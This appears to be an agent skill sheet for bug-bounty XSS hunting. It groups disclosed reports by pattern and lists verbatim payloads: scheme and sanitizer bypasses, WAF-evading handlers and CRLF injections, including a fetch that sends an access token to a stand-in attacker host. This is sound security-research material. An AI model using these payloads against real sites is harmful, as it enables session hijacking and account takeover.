---
name: hunter-l3-xss
description: "Use when hunting XSS on a target. Loads the L3 technique sheet: This class covers injection of attacker-controlled script into a browser execution context — reflected, stored, DOM-based, and \"XSS-adjacent\" variants (CSS injection leading to XSS, postMessage-driven"
domain: cybersecurity
subdomain: web
tags:
- web
- xss
- hunting
- l3
version: '1.0'
---

# XSS — Technique Sheet

## Overview
This class covers injection of attacker-controlled script into a browser execution context — reflected, stored, DOM-based, and "XSS-adjacent" variants (CSS injection leading to XSS, postMessage-driven JS execution, sanitizer bypasses, content-type sniffing). It pays when the injection lands on a sensitive origin (privileged `internal:`/`about:` pages, payment domains, main domains), when it chains to token/CSRF theft, or when it enables account takeover. A large and reliable slice of these records comes not from raw reflection but from misconfigured sanitizers, dangerous library defaults, and URL-scheme/redirect handling — hunt those systematically.

## Distinct sub-patterns

### 1. javascript: URL in user-controlled link/redirect fields
- **Endpoint shape / param:** any field rendered as an anchor `href` or consumed as a redirect target: `GET /login?next={url}`, profile link URL fields (`GET /settings/profile` param `url`), app "website" fields (`POST /apps` param `website`), OAuth `cancelUrl`/`returnUrl` (base64-encoded `flow` param on `GET /paypalme/my/landing`), `about:`-page link handlers (Tor `about:tbupdate?javascript:alert(1)`), Brave SessionRestoreHandler `url` param.
- **Payload that fired:**
  - `javascript:alert("proof of concept")` in `?next=` (id=683298, X)
  - `javascript:alert(8007)` as website field (id=127154, X)
  - `javascript:alert(document.domain+"http://")` as profile link (id=45484, Vimeo)
  - `javascripT:paypal.com` inside cancelUrl/returnUrl (id=425200, PayPal)
  - `java&#13;script:alert(1)` — entity-encoded control char splitting the scheme (id=3601655, Rails)
- **Root cause:** no scheme validation on values that become `href` or a redirect `Location`. Obfuscation variants work because validators normalize differently than browsers: case variation (`javascripT:`), entity-encoded control characters (`&#13;`) that strip-based validators remove before decoding, and `url.parse()`'s case-sensitive `javascript:` check plus `@` hostname spoofing (`javAscript:alert(1);a='@white-listed.com'`, id=395845 Node.js).
- **Impact proven:** script execution after login (X); `alert()` on www.paypal.com with attacker able to act as the authenticated user; XSS on privileged `internal://local` origin (Brave session restore); `Location: javascript:alert(1)` from a 302 via redirect-protection bypass `https://dev.twitter.com/web/sign-inhttps://dev.twitter.com/javascript:alert(1)/` (id=330008).
- **Exemplars:** 683298, 425200, 3601655, 395845.

### 2. Reflected HTML injection broken out of an attribute/value context
- **Endpoint shape / param:** `GET /{restaurant}/order` (Eternal/Zomato), OIDC form_post `state` param reflected into the response body (`POST` worldcoin.org), DoD registration "reason" editor rendering.
- **Payload that fired:**
  - `"><details onauxclick=x=prompt,x\`${document.cookie}\`></details>` (id=738810)
  - `"><svg height="1000" width="1000" onauxclick=confirm\`12233\`> <circle cx="500" cy="500" r="400" ... /></svg>` (id=743345)
  - `"><button onclick="fetch('https://attacker/steal?t='+document.forms[0].elements['access_token'].value)">Click</button>` in the `state` param (id=2515808, Tools for Humanity — **$7,000**)
  - `<iframe src="https://███████"></iframe>` in registration reason (id=1200770, DoD)
- **Root cause:** input reflected without escaping into HTML; quotes break out of an attribute. WAFs were bypassed by uncommon event handlers (`onauxclick`), tag-literal template-call syntax (`prompt\`...\``, `confirm\`...\``), and non-`script` tags (`details`, `svg`, `button`).
- **Impact proven:** WAF bypass + `document.cookie` prompt; OAuth access tokens of targeted users exfiltrated via a single click ($7k); phishing iframe on a genuine DoD site.
- **Exemplars:** 738810, 743345, 2515808.

### 3. Sanitizer / library bypass (rails-html-sanitizer, wp_kses, HTMLJanitor, antispambot, Bootbox)
- **Endpoint shape:** library APIs consuming user HTML: `Rails::Html::SafeListSanitizer.sanitize`, `sanitize()` with `config.action_view.sanitized_allowed_tags`, `wp_kses_bad_protocol_once`, `HTMLJanitor.clean()`, `bootbox.alert(message)`, WordPress `antispambot(email)`.
- **Payloads that fired (verbatim):**
  - `<select><style><script>alert(1)</script></style></select>` (ids 1599573, 1654310, 1805893 — nokogiri Ruby/Java parser differential; also incomplete CVE-2022-32209 fix where select+style removal applied only to per-call `:tags`, not class-level `allowed_tags` → CVE-2022-23520)
  - `<svg><use href="data:image/svg+xml;base64,PHN2ZyBpZD0neCcgeG1sbnM9...Pgo8aW1hZ2UgaHJlZj0iMSIgb25lcnJvcj0iYWxlcnQod2luZG93Lm9yaWdpbikiIC8+Cjwvc3Zn+#x"/></svg>` (id=1805873 — CVE-2022-23515: allowed `svg`+`use` loads base64 SVG whose `onerror` fires)
  - `<a href="javascript&#58alert(document.domain)">` — encoded colon *without* trailing semicolon bypasses wp_kses protocol check (id=339483, WordPress)
  - `myJanitor.clean("<p><img src onerror=alert()><p>")` — clean() sets innerHTML on a div, executing handlers during parse (id=308155)
  - `myJanitor.clean("<form><object onmouseover=alert(document.domain) name=_sanitized></object></form>")` — DOM clobbering of the `_sanitized` flag bypasses the whole loop (id=308158)
  - `<img src=x onerror=alert(1)>` surviving rails-html-sanitizer (id=42728, CVE-2015-7578); crafted CDATA input bypassing WhiteListSanitizer (id=81212, CVE-2015-7580)
  - `bootbox.alert("<script>alert(1);</script>")` (id=508446)
- **Root cause:** sanitizer/parser differentials, config-level allowlist gaps, missing character-set restrictions, DOM clobbering of internal flags, and libraries that render markup as HTML by design (Bootbox dialog messages).
- **Impact proven:** unescaped `<script>` surviving sanitization; `alert(window.origin)` execution; document.domain alerts in browsers; any site using the library vulnerable to stored/reflected XSS.
- **Exemplars:** 1599573, 1805873, 308158, 339483.

### 4. Framework translation/helper injection (Rails `t`/`translate` and tag helpers)
- **Endpoint shape:** controllers calling `t("..._html", default: <user input>)`; ActionView tag helpers with user-controlled attribute/tag names.
- **Payload that fired:** `"<script>alert(location)</script>"` via `GET /articles/missing_key?text=...` with a `_html`-suffixed key (id=2303609, Rails 7.0/7.1 — CVE-2024-26143 family, id=2520694); tag-name/attribute-name injection `something="something"><img src="/nonexistent" onerror="alert(1)"><div class` (id=1444151).
- **Root cause:** `translate` marks `_html`-key results (and defaults) `html_safe` without escaping; TagHelper doesn't restrict characters in user-controlled attribute/tag names, so names break out of the tag.
- **Impact proven:** `alert(location)` in a Rails 7 app (absent in 6.1); stored XSS for password/private-data theft in apps persisting the input.
- **Exemplars:** 2303609, 1444151, 2520694.

### 5. Rich-text / onebox / preview engines rendering external or unsanitized content
- **Endpoint shape / param:** `POST /t` topic-creation link preview (Discourse onebox), onebox audio/video URL parsing, Nextcloud Notes attachments preview, ActionText `to_markdown`, product import files (`POST /admin/products/import`, Shopify), Khan Academy CS iframe thrown-error `.html` property, app-name signature field rendered inside a `<script>` tag (`</script><svg onload=alert()>`, id=429679, Shopify).
- **Payloads that fired:**
  - Audio onebox: `http://host/path'onerror=alert(1);//k.mp3` (id=192223 — single quote breaks out of an attribute in the generated embed); also a crafted `bandcamp.com/album/` URL whose remote page content was rendered unsanitized (id=197443)
  - Notes attachment: `<img src=x onerror=alert(document.cookie)>` (id=1924355, CVE-2023-39955)
  - ActionText: `<action-text-markdown>[click](javascript:alert(1))</action-text-markdown>` — marker tag treated as trusted internal markup, bypassing URI-scheme validation (id=3727743)
  - Khan Academy: `throw {html:"<img src=x onerror=alert(document.domain)>"}` (id=103989)
- **Root cause:** preview/onebox engines trust URL contents or embed markup; rich-text converters whitelist their own marker tags; file importers render file content; error-handling UIs interpolate objects as HTML.
- **Impact proven:** JS execution in user sessions; profile bio modification from inside the CS iframe (Khan Academy); POST-based XSS in Firefox/IE/Edge from a shared signature URL.
- **Exemplars:** 192223, 3727743, 103989, 429679.

### 6. postMessage / cross-frame handlers without origin validation
- **Endpoint shape / param:** Marketo XDFrame `GET /index.php/form/XDFrame` accepting `ajaxParams` (JSONP); Shopify admin bar postMessage listener accepting `{"redirect_to_url":"https://attacker.example.com"}`; checkout.shopify.com sandbox `checkout_context` postMessage invoking `window.additionalScripts()`.
- **Payload that fired:** `{"url":"https://attacker.com/jsonp.php","dataType":"jsonp","method":"get"}` (id=207042, HackerOne); `{"redirect_to_url":"https://attacker.example.com"}` (id=387544); `window.additionalScripts = function(){/*attacker JS*/}` (id=1081145).
- **Root cause:** no/weak origin checks (`this.iframe.src.indexOf(a) < 0` is unanchored — `foo.myshopify.co` passes for `.com`); handler executes attacker-controlled callbacks or JSONP in the app's origin.
- **Impact proven:** stole contact-form submissions on www.hackerone.com ("I HAVE YOUR DATA NOW" alert); JS injected into shop front enabling CSRF-token extraction and admin password change; arbitrary JS on checkout.shopify.com intercepting address fields via iframing + `win.frames[]`.
- **Exemplars:** 207042, 387544, 1081145.

### 7. Content-type sniffing / upload-based XSS
- **Endpoint shape:** `GET /pypi/simple/{package}.tar.gz` (Uber); `POST upload.twitter.com` audience upload with params `blobstore_url`, `content`.
- **Payload that fired:** `<html><script>alert(0)</script></html>` inside a .tar.gz served as `application/octet-stream` (id=126360-style IE sniffing, id=126197); file named `foobar.test ; <script>alert(1)</script>` with unknown extension so no Content-Type is served (id=84601).
- **Root cause:** octet-stream/no-Content-Type responses get sniffed as HTML (IE reads first 256 bytes); upload filters block known-bad extensions but accept unknown ones.
- **Impact proven:** alert fires when opened in IE on pypi (and would on archive.uber.com); persistent XSS on ton.twitter.com via AppCache manifest poisoning from the victim's browser.
- **Exemplars:** 126197, 84601.

### 8. CRLF injection → data: URI / injected response XSS
- **Endpoint shape / param:** URL path on `team.badoo.com` (`/%0d%0adata:text/html,...`), DoD URL param.
- **Payload that fired:**
  - `https://team.badoo.com/%0d%0adata:text/html;text,%3Csvg%2fonload%3Dprompt%281%29%3E` (id=177624)
  - `http://www.example.com/%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(document.cookie)</script>` (id=225936)
- **Root cause:** CRLF reflected into the `Location` header; a `data:` URI scheme bypasses redirect restrictions; or full response-splitting injects a body.
- **Impact proven:** `prompt(1)` XSS on team.badoo.com; script execution via crafted URL on DoD site.
- **Exemplars:** 177624, 225936.

### 9. Android WebView / exported-activity HTML injection
- **Endpoint shape / param:** exported activities taking an `html` intent extra (Quora `ContentActivity`/`ModalContentActivity`/`ActionBarContentActivity`); ImageViewerActivity image URL (`com.irccloud.android`); Nextcloud desktop client error alert box.
- **Payloads that fired:** `<script src=//blackfan.ru></script>` (id=189793, Quora); `https://.../wow.jpg' onload='window.location.href="http://yahoo.com"` (id=283063, IRCCloud); `<A HREF="file:///C:/WINDOWS/system32/calc.exe">CALC.EXE</A>` (id=685552, Nextcloud desktop).
- **Root cause:** WebView renders attacker extras/concatenated strings at the main-site origin (`loadDataWithBaseURL` without escaping); desktop client renders server error body as HTML in a privileged alert.
- **Impact proven:** JS in www.quora.com context + JSBridge access (ClipboardData) and RCE on Android ≤ 4.2; browser redirect; **local CALC.EXE execution with no confirmation** on Nextcloud desktop.
- **Exemplars:** 189793, 283063, 685552.

### 10. Known-vulnerable components / template-parameter injection
- **Endpoint shape:** `GET /wp-content/themes/icos/assets/js/vendor/bootstrap.min.js` (Bootstrap 4.0.0, CVE-2019-8331 tooltip `data-template` XSS — payload `data-template='<div class="tooltip"...></div><img src=x onerror=alert(1)>'`, id=1218173); outdated Jetpack 3.9.1 leaked via `/wp-content/plugins/jetpack/readme.txt` (id=141728, LaTeX XSS, no execution PoC); Revive Adserver `GET /www/delivery/al.php?zoneid={num}&layerstyle={style}` with ~13 unsanitized template params — `closetext=%3Cscript%3Ealert(123);%3C/script%3E` (id=1694173, id=1694171); Vimeo moogaloop Flash player `cdn_url` loading arbitrary SWFs into f.vimeocdn.com's SecurityDomain with SharedObject poisoning (id=44512).
- **Root cause:** unsanitized template params injected into JS/CSS/HTML responses; version disclosure + known CVE; deprecated embed tech loading attacker SWFs unsandboxed.
- **Impact proven:** JS execution via `closetext`; CSS injection enabling CORS bypass when the adserver is whitelisted; JS execution (`confirm('moin: ' + document.domain)`) on any site embedding moogaloop after SharedObject poisoning.
- **Exemplars:** 1218173, 1694171, 44512.

### 11. API/config-param XSS via client-side doc tools
- **Endpoint shape / param:** Swagger-UI `configUrl` (Shopify `GET /classicapi/doc/?configUrl=data:text/html;base64,ewoidXJsIjo...`) and `config` (`GET /swagger?config=<gist URL>`, Ionity).
- **Payload that fired:** base64 data: URL wrapping `{"url": "https://exuberant-ice.surge.sh/test.yaml"}` (id=1444682); a gist-hosted JSON config (id=2534300).
- **Root cause:** Swagger-UI renders attacker-supplied config content into the HTML context unsanitized and accepts data:/remote URLs.
- **Impact proven:** arbitrary JS in jamfpro.shopifycloud.com context → **extracted authToken from localstorage → full takeover of an authenticated Jamf Pro account**; fake login page rendered on Ionity.
- **Exemplars:** 1444682, 2534300.

### 12. DOM/JS execution without server injection (browser/app surfaces)
- **Endpoint shape:** Brave ReaderMode `GET http://localhost:6571/reader-mode` — meta `author` content `Evil &lt;script nonce=%READER-TITLE-NONCE%&gt;alert(document.location);&lt;/script&gt;!--` exploiting unescaped READER-CREDITS insertion plus CSP nonce placeholder (id=1436142); Discourse onebox image/parser variants; Node `url.parse()` differential (above).
- **Impact proven:** alert on localhost:6571; chained to uuidKey leak (REFERER from ReaderViewLoading.html) → SessionRestoreHandler XSS on privileged `internal://local` (id=1438028 — a textbook privileged-origin chain).

## Bypass / chain notes
- **WAF bypass via obscure handlers + tag-literal calls:** `onauxclick` with `` x=prompt, x`...` `` syntax defeated Eternal's filter where `script`/`onload`-style payloads were blocked. Use `details`, `svg`, `button`, uncommon handlers.
- **Scheme-filter bypasses seen:** `javascripT:` (case), `java&#13;script:` (entity-encoded control chars decoded after stripping), `javascript&#58` without semicolon (wp_kses), `@`-hostname spoofing in `url.parse()`, unanchored origin `indexOf` checks (`foo.myshopify.co`).
- **Multi-step chains that multiplied value:**
  - Brave: meta-author payload → nonce reuse → uuidKey leak via Referer → privileged `internal:` XSS.
  - Shopify Swagger: data: configUrl → JS exec → localstorage authToken → account takeover.
  - Chaturbate: CSS injection via `bgcolor=%7D*%7Bbackground:red` breaking out of a `<style>` block → CSRF-token enumeration → XSS on other text/html endpoints.
  - Eternal: WAF bypass → reflected XSS → `document.cookie`.
  - Tools for Humanity: `state` HTML injection → one click → access-token exfil ($7,000).
  - Quora: intent extra → quora.com-origin JS → JSBridge → RCE (old Android).
  - Uber: content sniffing + upload param swap → AppCache poisoning → persistent XSS on ton.twitter.com.
  - Liberapay JSONP: `charts.json?callback=rip` leaked private donation data cross-origin despite `hide_receiving` and 403 for direct requests — related JSONP/callback-dump pattern worth probing alongside XSS.
  - Coinbase `/pusher/auth`: JSON-hijacking of a non-expiring auth token via cross-origin `JSON.parse` (same fetch-from-victim-browser family).

## Gotchas / what NOT to do
- **Don't report self-XSS / console execution.** id=1209098 (Reddit) — running `eval('ale'+'rt(0)')` in your own devtools was rejected; no server-side injection was demonstrated.
- **Version disclosure alone is weak.** id=141728 (Jetpack readme.txt) was accepted only as info with no execution PoC; pair vulnerable-component findings with a working payload.
- **Duplicates happen even when valid.** id=111131 and id=158757 (Deriv) were confirmed XSS but closed as duplicates — check for prior reports on main-domain XSS.
- **Don't assume cookies are stealable.** id=1200770: HttpOnly cookies weren't; impact had to be argued via phishing. Frame impact realistically.
- **Payloads not stated in several records** (id=81212 CDATA shape, id=2520694 default-value shape, id=450796) — reproduce and document your own verbatim PoC.
- **Non-alert impact still pays** when chained: CSS injection, JSONP, redirect-to-parent iframes (id=46818 Twitter Card `top.window.location.href` hijack) — report the chain, not just the popup.

## Real-world impact examples
- **$7,000 — Tools for Humanity (id=2515808):** HTML injection in OAuth `state` → access tokens of targeted users stolen via one injected-button click.
- **Full account takeover — Shopify Jamf Pro (id=1444682):** Swagger `configUrl` data: URL → JS exec → localstorage authToken exfil.
- **Local code execution — Nextcloud desktop (id=685552):** HTML in server error rendered in privileged alert box → CALC.EXE launched with no confirmation.
- **RCE path — Quora Android (id=189793):** exported activity WebView XSS at www.quora.com origin → JSBridge access → RCE on Android ≤ 4.2.
- **Persistent domain control — X/Twitter (id=84601):** unknown-extension upload with no Content-Type → AppCache manifest poisoning of ton.twitter.com.
- **Form-data theft — HackerOne (id=207042):** Marketo XDFrame postMessage → JSONP injection → contact-form submissions intercepted live.
- **Payment-flow interception — Shopify checkout (id=1081145):** arbitrary JS on checkout.shopify.com intercepting address autofill data.
- **Payment-site act-as-user — PayPal (id=425200):** `javascripT:` cancelUrl/returnUrl → JS exec on www.paypal.com.